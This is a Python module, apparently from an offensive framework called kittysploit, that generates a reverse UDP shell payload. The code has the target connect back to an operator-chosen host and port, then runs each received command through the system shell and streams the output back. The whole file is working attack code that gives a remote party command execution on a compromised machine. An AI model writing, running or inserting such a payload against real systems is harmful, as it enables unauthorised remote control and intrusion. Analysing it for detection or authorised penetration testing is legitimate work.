#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *


class Module(Payload):
    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Python Reverse UDP Shell",
        "description": "UDP connect-back shell (KS_UDP_HELLO protocol). Pairs with listeners/multi/reverse_udp",
        "category": PayloadCategory.CMD,
        "arch": Arch.PYTHON,
        "platform": Platform.MULTI,
        "listener": "listeners/multi/reverse_udp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(4444, "Callback UDP port", True)
    python_binary = OptString("python3", "Python on target", False)

    def generate(self):
        script = f'''
import socket,subprocess
H={str(self.lhost)!r};P={int(self.lport)}
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(b"KS_UDP_HELLO\\n",(H,P))
while True:
    data,_=s.recvfrom(65535)
    cmd=data.decode("utf-8","replace").strip()
    if not cmd or cmd in ("exit","quit"): break
    try:
        p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)
        out=(p.stdout or "")+(p.stderr or "") or f"exit {{p.returncode}}\\n"
    except Exception as e:
        out=str(e)+"\\n"
    out+="__KS_UDP_END__\\n"
    b=out.encode("utf-8","replace")
    for i in range(0,len(b),1200):
        s.sendto(b[i:i+1200],(H,P))
'''
        return self._encode_python_one_liner(script, self.python_binary)
